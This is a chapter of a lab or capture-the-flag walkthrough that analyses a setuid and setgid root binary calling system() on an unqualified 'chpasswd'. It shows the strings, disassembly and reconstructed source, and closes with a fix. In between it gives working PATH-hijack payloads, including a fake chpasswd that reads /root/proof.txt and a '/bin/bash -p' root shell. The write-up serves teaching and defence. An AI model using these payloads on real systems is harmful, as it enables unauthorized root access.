# 06 — Privilege escalation: `setuid` + `system()` = PATH hijack

The only non-stock finding from local enumeration was
`/home/john/RESET_PASSWD`, a setuid **and** setgid root binary in a user's home directory. This
chapter takes it apart and turns it into root.

---

## 6.1 The target

```bash
ls -l /home/john/RESET_PASSWD
file /home/john/RESET_PASSWD
```

```
-rwsrwsr-x 1 root root 16792 Nov 21  2022 /home/john/RESET_PASSWD
/home/john/RESET_PASSWD: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
  dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
  BuildID[sha1]=1fce3b4f2c8144ff27ecf785e711c7eb5fa2aaee, for GNU/Linux 3.2.0, not stripped
```

**Reading the mode string `-rwsrwsr-x`:**

| Position | Meaning |
|---|---|
| `rws` (owner) | owner is `root`, **setuid bit set** — the process gets `euid=0` |
| `rws` (group) | group is `root`, **setgid bit set** — the process gets `egid=0` |
| `r-x` (other) | **world-executable** — every local user can run it |

Setuid **and** setgid on the same binary is unusual and a strong signal by itself. World-executable
means it is usable by our unprivileged account, no group membership required.

`not stripped` is the best news here: function names survive, so analysis is direct.

## 6.2 Strings

```bash
strings -a /home/john/RESET_PASSWD | head -40
```

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
[]A\A]A^A_
echo kiero:kiero | chpasswd
echo Resetting password of 'kiero' to the default value
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
RESET_PASSWD.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main
_edata
setuid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
```

Three lines decide the whole box:

```
setuid
system
echo kiero:kiero | chpasswd
```

**Reading it:** the program is a ~20-line C file (`RESET_PASSWD.c`) that calls `setuid(0)`, then
`system()` on a fixed string. The string pipes `kiero:kiero` into **`chpasswd`** — and `chpasswd` is
a bare command name with **no path**. That is the bug.

## 6.3 Confirming with the disassembly

Copying the binary locally (read-only on the target) and disassembling `main`:

```bash
# on Kali — the BuildID matches the on-host `file` output, so the copy is exact
ssh -i id_rsa john@192.168.245.149 'cat /home/john/RESET_PASSWD' > RESET_PASSWD.bin
md5sum RESET_PASSWD.bin
objdump -d -M intel RESET_PASSWD.bin | sed -n '/<main>:/,/^$/p'
```

```
0000000000001189 <main>:
    1189: f3 0f 1e fa          endbr64
    118d: 55                   push   rbp
    118e: 48 89 e5             mov    rbp,rsp
    1191: bf 00 00 00 00       mov    edi,0x0
    1196: b8 00 00 00 00       mov    eax,0x0
    119b: e8 f0 fe ff ff       call   1090 <setuid@plt>        ; setuid(0)
    11a0: bf 00 00 00 00       mov    edi,0x0
    11a5: b8 00 00 00 00       mov    eax,0x0
    11aa: e8 d1 fe ff ff       call   1080 <setgid@plt>        ; setgid(0)
    11af: 48 8d 3d 52 0e 00 00 lea    rdi,[rip+0xe52]        # 2008
    11b6: b8 00 00 00 00       mov    eax,0x0
    11bb: e8 b0 fe ff ff       call   1070 <system@plt>        ; system("echo kiero:kiero | chpasswd")
    11c0: 48 8d 3d 61 0e 00 00 lea    rdi,[rip+0xe61]        # 2028
    11c7: b8 00 00 00 00       mov    eax,0x0
    11cc: e8 9f fe ff ff       call   1070 <system@plt>        ; system("echo Resetting ...")
    11d1: b8 00 00 00 00       mov    eax,0x0
    11d6: 5d                   pop    rbp
    11d7: c3                   ret
```

And the two string offsets from `.rodata`:

```
 2000 01000200 00000000 6563686f 206b6965  ........echo kie
 2010 726f3a6b 6965726f 207c2063 68706173  ro:kiero | chpas
 2020 73776400 00000000 6563686f 20526573  swd.....echo Res
```

- `0x2008` → `echo kiero:kiero | chpasswd`
- `0x2028` → `echo Resetting password of 'kiero' to the default value`

So the reconstructed source is:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("echo kiero:kiero | chpasswd");
    system("echo Resetting password of 'kiero' to the default value");
    return 0;
}
```

Security properties of this file:

| Property | Value | Relevance |
|---|---|---|
| Type | `DYN`, PIE | ASLR-friendly, but irrelevant here |
| Relro | `BIND_NOW`, full | GOT overwrite is out — no memory corruption path |
| Compiler | GCC 9.4.0 Ubuntu | modern `-fstack-protector` defaults, but again irrelevant |
| Return values | none checked | no error handling; failures are silent |
| Path to `chpasswd` | **none** | **the vulnerability** |

Nothing here is exploitable via memory corruption. The flaw is entirely in the *program logic*:
trusting the environment for command resolution.

## 6.4 Why this is exploitable

`system(3)` is documented as running the command via `/bin/sh -c`. The shell therefore performs a
**`PATH` lookup** for `chpasswd`, and `PATH` is inherited from the calling process — which the
attacker controls.

The usual protection against setuid programs being abused this way is that `sh` **drops privileges**
when the real and effective UIDs differ, so `system()` inside a setuid binary would run as the
*real* user. That protection does not help here, and the reason is the first two instructions:

```c
setuid(0);   /* ruid = euid = suid = 0  */
setgid(0);   /* rgid = egid = sgid = 0  */
```

`setuid(0)` called with `euid==0` (which we have, thanks to the setuid bit) sets **all three** UIDs
— real, effective and saved — to 0. After that call, `ruid == euid == 0`, so `/bin/sh` sees no
mismatch, does not drop anything, and executes our binary with full root. The program disables its
own safety net.

So the attack is: put a program called `chpasswd` in a directory, prepend that directory to `PATH`,
run the SUID binary. The binary sets itself to root, then asks the shell to run the first `chpasswd`
it finds on `PATH` — which is ours.

## 6.5 Building the exploit

Any payload works. This one proves root non-destructively by capturing identity and reading the
root-only proof file, rather than spawning an interactive shell.

```bash
D=$(mktemp -d /tmp/pp.XXXXXX)

cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
ls -la /root > /tmp/root_ls.txt 2>&1
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_ls.txt /tmp/root_proof.txt
EOF

chmod +x "$D/chpasswd"
PATH="$D:$PATH" /home/john/RESET_PASSWD
```

```
Resetting password of kiero to the default value
```

**Reading that output:** the banner is the *second* `system()` call executing normally. Our payload
ran during the *first* one.

Two points worth being precise about:

- **The real password reset never happens.** The first `system()` call would have run the genuine
  `chpasswd`, but we replaced it. This exploit therefore does *not* change `kiero`'s password — a
  detail worth knowing on an exam, where you must not silently break accounts you have finished
  with.
- **Ordering.** `system()` returns only after the child exits, so both calls run sequentially and
  the second banner is not evidence about the first.

Alternative payloads for an interactive shell:

```bash
# interactive root shell
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /home/john/RESET_PASSWD
```

(`bash -p` preserves the effective UID. A plain `bash` also works here precisely because
`setuid(0)` already made the real UID 0 — but `-p` is the habit to keep for setuid binaries that
have *not* done that.)

## 6.6 Result — root

```bash
cat /tmp/root_id.txt
```

```
uid=0(root) gid=0(root) groups=0(root),1000(john)
```

```bash
cat /tmp/root_ls.txt
```

```
total 60
drwx------  6 root root  4096 Nov 14 18:33 .
drwxr-xr-x 19 root root  4096 Nov 14 18:33 ..
lrwxrwxrwx  1 root root     9 Nov 21  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwx------  2 root root  4096 Nov 17  2022 .cache
drwxr-xr-x  3 root root  4096 Apr 25  2023 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
drwx------  2 root root  4096 Nov 21  2022 .ssh
-rw-------  1 root root 10613 Nov 22  2022 .viminfo
-rw-r--r--  1 root root    33 Nov 14 18:35 proof.txt
-rwxr-xr-x  1 root root 12227 Nov 14 18:33 set-net.sh
drwx------  3 root root  4096 Nov  2  2022 snap
```

**Reading it:**

- `uid=0(root) gid=0(root)` — full root.
- `groups=0(root),1000(john)` — the supplementary list still carries `john`'s group 1000 and has
  gained root's group 0. That is the fingerprint of `setgid(0)` on top of our existing groups: no
  `initgroups`, so `john`'s group was not dropped. Not a problem — it is evidence about *how* the
  binary behaves.
- `/root` is readable, which by definition means `euid=0` in practice and not just on paper.

Note `/root/set-net.sh` — a lab provisioning script (netplan interface builder). It configures the
host's own single NIC and gateway and contains no credentials; it is not a pivot artifact. It was
unreadable as `john` (`Permission denied`) and readable as root, which is a second, independent
confirmation of the privilege change.

## 6.7 Why this is the intended path

- The binary is **named in the SNMP extend** that also leaked the account name — the box hands you
  the privesc pointer during initial access.
- It is **setuid *and* setgid**, world-executable, and sits in the unprivileged user's home
  directory. All three are deliberate choices.
- It calls `setuid(0)` then `system()` with an unqualified command — a textbook CWE-426
  (`Untrusted Search Path`) pattern that no amount of patching elsewhere would fix.
- Every other vector was dead (chapter 05), so the box is unambiguous.

## 6.8 Fix, for the record

```c
/* vulnerable */
system("echo kiero:kiero | chpasswd");

/* fixed — no shell, no PATH lookup, fixed environment */
execl("/usr/sbin/chpasswd", "chpasswd", (char *)NULL);
```

or better, drop the shell entirely and write to the shadow database through the PAM/libc API as
root. Also: remove the setuid bit (the task needs root, but it does not need to be *reachable* by
users), change file mode from `6775` to `4755` at minimum, and never install a setuid helper inside
a user-writable home directory.

→ [07 — Flags and cleanup](07-flags-and-cleanup.md)
